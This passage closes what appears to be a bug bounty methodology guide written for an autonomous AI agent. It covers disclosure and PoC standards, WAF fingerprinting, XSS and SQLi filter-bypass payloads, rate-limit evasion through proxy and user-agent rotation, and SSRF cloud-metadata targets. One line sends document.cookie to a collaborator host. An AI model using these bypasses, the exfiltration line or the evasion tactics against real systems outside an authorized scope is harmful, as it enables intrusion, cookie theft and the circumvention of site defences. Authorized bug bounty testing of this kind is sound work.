| IDOR (admin access) | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | 8.1 |
| SSRF (internal) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N | 8.6 |
| SSRF (cloud metadata) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N | 9.9 |
| Auth Bypass | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 |
| RCE | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 |

### 4.3 Proof-of-Concept Documentation Standards

#### PoC Requirements Checklist

- [ ] **Exact reproduction steps** - Numbered, unambiguous
- [ ] **Complete HTTP requests** - All headers, body content
- [ ] **Expected vs actual behavior** - Clear comparison
- [ ] **Screenshots** - Annotated, showing before/after
- [ ] **Video recording** - Required by many programs (under 2 minutes)
- [ ] **No malicious impact** - Never harm real users or data
- [ ] **Minimal test case** - Remove unnecessary steps
- [ ] **Environment details** - Browser version, OS if relevant
- [ ] **Timestamp** - When the vulnerability was confirmed

### 4.4 Video/Screenshot Requirements

#### Recording Guidelines

```
1. Start with URL visible in address bar
2. Show login state (who you are logged in as)
3. Perform each step slowly and clearly
4. Show the vulnerability trigger clearly
5. Show the impact (data exposed, action performed)
6. Keep video under 2 minutes
7. Use screen recording software (OBS, QuickTime, etc.)
8. No background music or voiceover needed
9. Add text annotations for key steps
10. End with timestamp and your HackerOne username visible
```

### 4.5 Responsible Disclosure Timeline

#### Standard Disclosure Timeline

| Day | Action |
|-----|--------|
| 0 | Submit report to platform |
| 1-3 | Initial triage by platform team |
| 3-7 | Company acknowledges and begins investigation |
| 7-14 | Company validates/rejects the finding |
| 14-30 | Fix development and deployment |
| 30-90 | Retest and confirm fix |
| 90+ | Public disclosure (coordinated) |

#### Disclosure Policy Types

| Type | Description | AI Agent Action |
|------|-------------|-----------------|
| Coordinated Disclosure | Fixed first, disclosed later | Wait for fix confirmation |
| Full Disclosure | Immediate public disclosure | Not recommended for bounty |
| Responsible Disclosure | Researcher-controlled timeline | Default approach |
| Non-Disclosure | No public disclosure allowed | Respect program terms |

---

## 5. Retry & Bypass Strategies

### 5.1 WAF Fingerprinting Methodology

#### WAF Identification Techniques

```bash
# Step 1: Standard Request (Baseline)
curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q=test"
# Expected: 200

# Step 2: XSS Payload Test
curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q=<script>alert(1)</script>"
# WAF Block: 403, 406, 419, 501, or custom error page

# Step 3: SQLi Payload Test
curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q='OR'1'='1"
# WAF Block: Same as above

# Step 4: Analyze Response
# - Check for specific headers: X-CDN, CF-RAY, Server, X-WAF
# - Check response body for WAF branding
# - Check response time (WAF adds latency)
```

#### WAF-Specific Signatures

| WAF | Identification Method | Bypass Difficulty |
|-----|----------------------|-------------------|
| **Cloudflare** | `CF-RAY` header, `__cfuid` cookie, 403 page with Cloudflare logo | Hard |
| **AWS WAF** | `X-AMZ-CF-ID` header, CloudFront distribution | Medium |
| **Akamai** | `X-Akamai-Request-BC` header, `Server: AkamaiGHost` | Medium |
| **Imperva/Incapsula** | `X-Iinfo` header, `Set-Cookie: visid_incap_` | Hard |
| **Sucuri** | `X-Sucuri-ID` header, `Server: Sucuri/Cloudproxy` | Medium |
| **F5 BIG-IP ASM** | `Server: BigIP`, `X-WA-Info` header | Medium |
| **ModSecurity** | `Server` header, 406 response codes | Easy-Medium |
| **Barracuda** | `X-Barracuda-*` headers | Medium |
| **Fastly** | `X-Served-By`, `X-Cache` headers | Medium |
| **Palo Alto** | Custom block page, 403 with PA reference | Hard |

#### Advanced WAF Fingerprinting

```bash
# Technique 1: Header Analysis
curl -sI "https://target.com" | grep -iE "(server|via|x-cache|x-cdn|cf-ray|x-sucuri)"

# Technique 2: Response Body Analysis
curl -s "https://target.com/?q=<script>" | grep -ioE "(cloudflare|akamai|incapsula|sucuri|barracuda|bigip)" | head -5

# Technique 3: Cookie Analysis
curl -sI "https://target.com" | grep -i "set-cookie" | grep -ioE "(__cfduid|visid_incap|sucuri|AWSALB)"

# Technique 4: Error Page Analysis
# Different WAFs have different error page templates
# Save and compare error pages from known WAFs

# Technique 5: Timing Analysis
time curl -s "https://target.com/?q=test" > /dev/null
time curl -s "https://target.com/?q=<script>" > /dev/null
# WAF processing adds 10-100ms latency
```

### 5.2 Encoding-Based Bypasses

#### HTML Entity Encoding

```html
<!-- Named entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;

<!-- Decimal entities -->
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

<!-- Hex entities -->
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;

<!-- Mixed encoding -->
&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;
```

#### URL Encoding Techniques

```
# Single encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E

# Mixed encoding
%3C%73%63%72%69%70%74%3Ealert(1)%3C/script%3E

# Unicode encoding
%u003C%u0073%u0063%u0072%u0069%u0070%u0074%u003E
\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e

# Overlong UTF-8
%c0%bc%c0%af (for < > in some parsers)

# Percent-encoding with null
%00%3Cscript%3E (null byte prefix)
```

#### Unicode Normalization Abuse

```javascript
// Unicode characters that normalize to dangerous characters
// U+FF1C ＜ (FULLWIDTH LESS-THAN SIGN) → normalizes to <
＜script＞alert(1)＜/script＞

// U+FE64 ﹤ (SMALL LESS-THAN SIGN) → normalizes to <
﹤script﹥alert(1)﹤/script﹥

// U+02C7 ˇ → can be used in attribute context
" ˇ onmouseover=alert(1) x="

// Homoglyph attacks
ѕсrіpt (using Cyrillic characters)
јаvascript: (mixed Latin/Cyrillic)
```

### 5.3 Context-Specific Payload Mutation

#### HTML Context Mutations

```html
<!-- Standard -->
<script>alert(1)</script>

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Tag omission -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Whitespace tricks -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>

<!-- Quoteless attributes -->
<img src=x onerror=alert(1)>

<!-- HTML5 parsing tricks -->
<details/open/ontoggle=alert(1)>
<marquee/onstart=alert(1)>
<meter/onforminput=alert(1)>

<!-- Foreign object -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style>
```

#### JavaScript Context Mutations

```javascript
// Standard
';alert(1);//

// Template literal
`${alert(1)}`

// Arrow function
Function`alert(1)`

// Unicode escapes
\u0027;alert(1)\u002f\u002f

// Octal escapes
\47;alert(1)//

// Hex escapes
\x27;alert(1)//

// Multi-line comment
*/alert(1)/*

// Property access
[].constructor.constructor`alert(1)`

// Fetch API for blind exfiltration
fetch`//${document.cookie}.burpcollaborator.net`
```

### 5.4 Time-Based Evasion Techniques

#### Request Timing Strategies

```python
# Technique 1: Random delays between requests
import random
import time

def random_delay():
    time.sleep(random.uniform(1, 5))

# Technique 2: Exponential backoff on rate limit
import time

def exponential_backoff(attempt):
    delay = min(2 ** attempt, 60)  # Cap at 60 seconds
    time.sleep(delay)

# Technique 3: Jitter to avoid pattern detection
def jittered_delay(base_delay=2.0, jitter=0.5):
    import random
    time.sleep(base_delay + random.uniform(-jitter, jitter))

# Technique 4: Adaptive throttling based on responses
def adaptive_throttle(response_time, status_code):
    if status_code == 429:  # Too Many Requests
        time.sleep(60)
    elif response_time > 2.0:  # Slow response = possible throttling
        time.sleep(5)
```

### 5.5 Rate Limit Handling and Request Throttling

#### Rate Limit Evasion Strategies

```python
# Strategy 1: Request distribution across time
# Instead of 100 requests in 1 second:
# -> 100 requests over 60 seconds (1 request per 0.6s)

# Strategy 2: Proxy rotation
import itertools

proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080",
]
proxy_cycle = itertools.cycle(proxies)

for request in requests:
    proxy = next(proxy_cycle)
    send_request(request, proxy=proxy)

# Strategy 3: User-Agent rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

# Strategy 4: Session rotation
# Maintain multiple sessions, rotate between them

# Strategy 5: Geographic distribution
# Use proxies from different regions

# Strategy 6: Request pattern randomization
# Vary: request timing, parameter order, header order, case
```

#### Rate Limit Response Handling

| Response Code | Meaning | Action |
|---------------|---------|--------|
| 429 | Too Many Requests | Wait for Retry-After header, then retry |
| 503 | Service Unavailable | Back off significantly (60s+) |
| 403 | Forbidden (possible IP block) | Rotate proxy, reduce rate |
| 408 | Request Timeout | Reduce request complexity, retry |
| 444 | Nginx: Connection closed | Reduce rate, check proxy health |
| 499 | Nginx: Client closed | Server may be rate limiting |

#### Headers for Rate Limit Detection

```bash
# Check for rate limit headers
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 1640995200
Retry-After: 3600
X-RateLimit-Retry-After: 3600

# Parse and respect these headers
# Never exceed the remaining limit
# Honor Retry-After when receiving 429
```

---

## Appendix A: Decision Checklists

### Pre-Engagement Checklist
- [ ] Read and understand the program scope (in-scope/out-of-scope)
- [ ] Review the program's policy on automated testing
- [ ] Understand the program's rate limiting expectations
- [ ] Check for safe harbor provisions
- [ ] Identify excluded vulnerability classes
- [ ] Note special requirements (video PoC, specific formats)
- [ ] Set up dedicated testing environment

### During Hunting Checklist
- [ ] Log all requests and responses
- [ ] Document every finding immediately
- [ ] Take screenshots of interesting behavior
- [ ] Test each finding with multiple payloads
- [ ] Verify findings across browsers/conditions
- [ ] Never test on production data or real users
- [ ] Respect rate limits and scope boundaries

### Pre-Submission Checklist
- [ ] Re-read the vulnerability (fresh eyes)
- [ ] Verify reproducibility from clean state
- [ ] Confirm no duplicate (search program history)
- [ ] Prepare minimal, clear PoC
- [ ] Calculate accurate CVSS score
- [ ] Write clear, concise report
- [ ] Include suggested fix
- [ ] Attach required evidence (screenshots/video)

---

## Appendix B: Reference Payloads

### Quick XSS Payloads by Context

| Context | Detection | Exploitation |
|---------|-----------|-------------|
| HTML | `<xss_test>` | `<img src=x onerror=alert(1)>` |
| Attribute | `" xss_test` | `" onfocus=alert(1) autofocus x="` |
| JS String | `';alert('xss');//` | `'-alert(1)-'` |
| JS Template | `${7*7}` | `${alert(1)}` |
| URL | `javascript:alert(1)` | `javascript:alert(1)` |
| CSS | `}body{xss:test}` | `</style><img src=x onerror=alert(1)>` |

### Quick SQLi Payloads by Database

| Database | Version Query | Comment | String Concat |
|----------|--------------|---------|---------------|
| MySQL | `@@version` | `#`, `-- ` | `CONCAT('a','b')` |
| PostgreSQL | `version()` | `--`, `/* */` | `'a'\|\|'b'` |
| MSSQL | `@@VERSION` | `--`, `/* */` | `'a'+'b'` |
| Oracle | `SELECT * FROM v$version` | `--`, `/* */` | `'a'\|\|'b'` |
| SQLite | `sqlite_version()` | `--`, `/* */` | `'a'\|\|'b'` |

### Quick SSRF Test Targets

| Target | URL | Expected Result |
|--------|-----|----------------|
| AWS Metadata | `http://169.254.169.254/latest/meta-data/` | IAM role name |
| GCP Metadata | `http://metadata.google.internal/` | Compute metadata |
| Azure Metadata | `http://169.254.169.254/metadata/instance` | Instance info |
| Localhost | `http://127.0.0.1:22/` | SSH banner |
| Internal DNS | `http://internal.target.com/` | Internal service |

---

*End of Autonomous Bug Bounty Hunting Methodology*
